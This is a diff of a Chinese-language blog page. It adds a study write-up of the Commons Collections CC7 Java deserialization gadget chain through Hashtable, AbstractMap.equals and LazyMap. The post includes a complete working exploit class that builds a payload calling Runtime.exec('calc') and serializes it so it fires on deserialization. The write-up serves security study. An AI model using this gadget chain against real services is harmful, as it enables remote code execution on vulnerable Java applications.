@@ -19,17 +19,20 @@
   <meta name="author" content="rPniu">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Have a nice day!">
+    <meta name="description" content="CC7 与CC5类似，后半还是LazyMap.get()链子 直接看链子，get()确实很多调用的 java.util.AbstractMap     public boolean equals(Object o) {         if (o &#x3D;&#x3D; this)             return true; ​         if (!(o instanceof Map">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java-CC7">
 <meta property="og:url" content="https://rpniu.github.io/2025/04/02/Java-CC7/index.html">
 <meta property="og:site_name" content="rPniu">
-<meta property="og:description" content="Have a nice day!">
+<meta property="og:description" content="CC7 与CC5类似，后半还是LazyMap.get()链子 直接看链子，get()确实很多调用的 java.util.AbstractMap     public boolean equals(Object o) {         if (o &#x3D;&#x3D; this)             return true; ​         if (!(o instanceof Map">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="file:///D:/markdown/JavaSec/CC%E9%93%BE/Java_CC7/image-20250402195716790.png?lastModify=1744725404">
 <meta property="article:published_time" content="2025-04-02T12:29:26.000Z">
-<meta property="article:modified_time" content="2025-04-02T12:29:26.172Z">
+<meta property="article:modified_time" content="2025-04-15T13:56:54.153Z">
 <meta property="article:author" content="rPniu">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="file:///D:/markdown/JavaSec/CC%E9%93%BE/Java_CC7/image-20250402195716790.png?lastModify=1744725404">
   
   
   
@@ -234,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          896 字
         
       </span>
     
@@ -245,7 +248,7 @@
         
         
         
-          1 分钟
+          8 分钟
         
       </span>
     
@@ -287,7 +290,26 @@
             
               <div class="markdown-body">
                 
-                
+                <p>CC7</p>
+<p>与CC5类似，后半还是<code>LazyMap.get()</code>链子</p>
+<p>直接看<a href="####%E9%93%BE%E5%AD%90">链子</a>，get()确实很多调用的</p>
+<h3 id="java-util-AbstractMap"><a href="#java-util-AbstractMap" class="headerlink" title="java.util.AbstractMap"></a>java.util.AbstractMap</h3><p>     public boolean equals(Object o) {<br>         if (o &#x3D;&#x3D; this)<br>             return true;<br> ​<br>         if (!(o instanceof Map))<br>             return false;<br>         Map<?,?> m &#x3D; (Map<?,?>) o;<br>         if (m.size() !&#x3D; size())<br>             return false;<br> ​<br>         try {<br>             Iterator&lt;Entry&lt;K,V&gt;&gt; i &#x3D; entrySet().iterator();<br>             while (i.hasNext()) {<br>                 Entry&lt;K,V&gt; e &#x3D; i.next();<br>                 K key &#x3D; e.getKey();<br>                 V value &#x3D; e.getValue();<br>                 if (value &#x3D;&#x3D; null) {<br>                     if (!(m.get(key)&#x3D;&#x3D;null &amp;&amp; m.containsKey(key)))<br>                         return false;<br>                 } else {<br>                     if (!value.equals(m.get(key)))<br>                         return false;<br>                 }<br>             }<br>         } catch (ClassCastException unused) {<br>             return false;<br>         } catch (NullPointerException unused) {<br>             return false;<br>         }<br> ​<br>         return true;<br>     }<br> ​<br>     public int size() {<br>         return entrySet().size();<br>     }</p>
+<p>需要注意的是第三个<code>if</code>比较，这里会比较传入map和原map的大小</p>
+<h3 id="java-util-Hashtable"><a href="#java-util-Hashtable" class="headerlink" title="java.util.Hashtable"></a>java.util.Hashtable</h3><p>入口：java.util.Hashtable#readObject</p>
+<p>     private void readObject(java.io.ObjectInputStream s)<br>          throws IOException, ClassNotFoundException<br>     {<br>         s.defaultReadObject();<br>         <br>         &#x2F;&#x2F;hashtable序列化时的大小<br>         int origlength &#x3D; s.readInt();<br>         &#x2F;&#x2F;Hashtable 存储的 键值对个数<br>         int elements &#x3D; s.readInt();<br> ​<br>         int length &#x3D; (int)(elements * loadFactor) + (elements &#x2F; 20) + 3;<br>         if (length &gt; elements &amp;&amp; (length &amp; 1) &#x3D;&#x3D; 0)<br>             length–;<br>         if (origlength &gt; 0 &amp;&amp; length &gt; origlength)<br>             length &#x3D; origlength;<br>         table &#x3D; new Entry<?,?>[length];<br>         threshold &#x3D; (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);<br>         count &#x3D; 0;<br> ​<br>         &#x2F;&#x2F; 逐个读取键值对<br>         for (; elements &gt; 0; elements–) {<br>             @SuppressWarnings(“unchecked”)<br>                 K key &#x3D; (K)s.readObject();<br>             @SuppressWarnings(“unchecked”)<br>                 V value &#x3D; (V)s.readObject();<br>             &#x2F;&#x2F; synch could be eliminated for performance<br>             reconstitutionPut(table, key, value);<br>         }<br>     }</p>
+<p><code>reconstitutionPut</code>是比较关键的地方。在第12行触发链子，需要满足前一个条件的成立 <code>e.hash == hash</code>，<code>e.key</code>为一个lazymap。</p>
+<p>因为他是将<code>tab</code>中的每一个元素都拿出来对比，所以需要至少传入两个元素。存入元素使用的是put方法。</p>
+<p>     private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)<br>         throws StreamCorruptedException<br>     {<br>         if (value &#x3D;&#x3D; null) {<br>             throw new java.io.StreamCorruptedException();<br>         }<br>         &#x2F;&#x2F; Makes sure the key is not already in the hashtable.<br>         &#x2F;&#x2F; This should not happen in deserialized version.<br>         int hash &#x3D; key.hashCode();<br>         int index &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length;<br>         for (Entry<?,?> e &#x3D; tab[index] ; e !&#x3D; null ; e &#x3D; e.next) {<br>             if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key)) {<br>                 throw new java.io.StreamCorruptedException();<br>             }<br>         }<br>         &#x2F;&#x2F; Creates the new entry.<br>         @SuppressWarnings(“unchecked”)<br>             Entry&lt;K,V&gt; e &#x3D; (Entry&lt;K,V&gt;)tab[index];<br>         tab[index] &#x3D; new Entry&lt;&gt;(hash, key, value, e);<br>         count++;<br>     }</p>
+<p>因为反序列化时要触发 <code>reconstitutionPut()</code>中的 <code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code>，我们传入的值的<code>hashcode</code>，要冲突，才会触发equals。但是存在一点小问题需要解决。</p>
+<p>     public synchronized V put(K key, V value) {<br>         &#x2F;&#x2F; Make sure the value is not null<br>         if (value &#x3D;&#x3D; null) {<br>             throw new NullPointerException();<br>         }<br>         &#x2F;&#x2F; Makes sure the key is not already in the hashtable.<br>         Entry<?,?> tab[] &#x3D; table;<br>         int hash &#x3D; key.hashCode();<br>         int index &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length;<br>         @SuppressWarnings(“unchecked”)<br>         Entry&lt;K,V&gt; entry &#x3D; (Entry&lt;K,V&gt;)tab[index];<br>         for(; entry !&#x3D; null ; entry &#x3D; entry.next) {<br>             if ((entry.hash &#x3D;&#x3D; hash) &amp;&amp; entry.key.equals(key)) {<br>                 V old &#x3D; entry.value;<br>                 entry.value &#x3D; value;<br>                 return old;<br>             }<br>         }<br>         addEntry(hash, key, value, index);<br>         return null;<br>     }</p>
+<h4 id="yy和zZ"><a href="#yy和zZ" class="headerlink" title="yy和zZ"></a>yy和zZ</h4><p>两个值的hashcode相等，为什么不直接存入两个相同的值，因为在使用put存入键值对的时候，两个相同的key是不行的。</p>
+<p><img src="file://D:\markdown\JavaSec\CC%E9%93%BE\Java_CC7\image-20250402195716790.png?lastModify=1744725404" srcset="/image/loading.gif" lazyload alt="image-20250402195716790"></p>
+<p>但是第二次put的时候，会触发equals，会在 <code>org.apache.commons.collections.map.LazyMap#get</code>时加入新的键值对，与CC6中类似。</p>
+<p> public Object get(Object key) {<br>     &#x2F;&#x2F; create value for key if key is not currently in the map<br>     if (map.containsKey(key) &#x3D;&#x3D; false) {<br>         Object value &#x3D; factory.transform(key);<br>         map.put(key, value);<br>         return value;<br>     }<br>     return map.get(key);<br> }</p>
+<h4 id="remove-“yy”"><a href="#remove-“yy”" class="headerlink" title="remove(“yy”)"></a>remove(“yy”)</h4><p>需要remove这一步骤，因为在 <a href="###java.util.AbstractMap">java.util.AbstractMap#equals</a>处会比较两个lazymap的大小。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p> import org.apache.commons.collections.Transformer;<br> import org.apache.commons.collections.functors.ChainedTransformer;<br> import org.apache.commons.collections.functors.ConstantTransformer;<br> import org.apache.commons.collections.functors.InvokerTransformer;<br> import org.apache.commons.collections.keyvalue.TiedMapEntry;<br> import org.apache.commons.collections.map.LazyMap;<br> import org.junit.Test;<br> ​<br> import java.io.*;<br> import java.lang.reflect.Field;<br> import java.util.HashMap;<br> import java.util.Hashtable;<br> import java.util.Map;<br> ​<br> public class CC7Test {<br>     public static void serializable(Object obj) throws IOException {<br>         ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(“ser.bin”));<br>         oos.writeObject(obj);<br>     }<br> ​<br>     public static Object unserializable(String path) throws IOException, ClassNotFoundException {<br>         ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(path));<br>         return ois.readObject();<br>     }<br>     @Test<br>     public void test() throws Exception {<br>         Transformer[] transformers &#x3D; new Transformer[]{<br>                 new ConstantTransformer(Runtime.class),<br>                 new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br>                 new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br>                 new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”})<br>         };<br> ​<br>         ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(new Transformer[]{});<br> ​<br>         HashMap hashMap1 &#x3D; new HashMap();<br>         HashMap hashMap2 &#x3D; new HashMap();<br>         Map lazymap1 &#x3D;  LazyMap.decorate(hashMap1, chainedTransformer);<br>         Map lazymap2 &#x3D;  LazyMap.decorate(hashMap2, chainedTransformer);<br> ​<br>         lazymap1.put(“yy”, 1);<br>         lazymap2.put(“zZ”, 1);<br> ​<br> ​<br>         Hashtable hashtable &#x3D; new Hashtable();<br>         hashtable.put(lazymap1, 1);<br>         hashtable.put(lazymap2, 1);<br> ​<br>         lazymap2.remove(“yy”);<br> ​<br>         Class c &#x3D; chainedTransformer.getClass();<br>         Field field &#x3D; c.getDeclaredField(“iTransformers”);<br>         field.setAccessible(true);<br>         field.set(chainedTransformer, transformers);<br> ​<br>         serializable(hashtable);<br>     }<br> ​<br>     @Test<br>     public void test2() throws IOException, ClassNotFoundException {<br>         unserializable(“ser.bin”);<br>     }<br> }</p>
+<h3 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h3><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><p> java.util.Hashtable#readObject<br> java.util.Hashtable#reconstitutionPut<br> org.apache.commons.collections.map.AbstractMapDecorator#equals<br> java.util.AbstractMap#equals</p>
+
                 
               </div>
             
@@ -295,6 +317,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java/" class="category-chain-item">java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+    </div>
   
 </div>
 
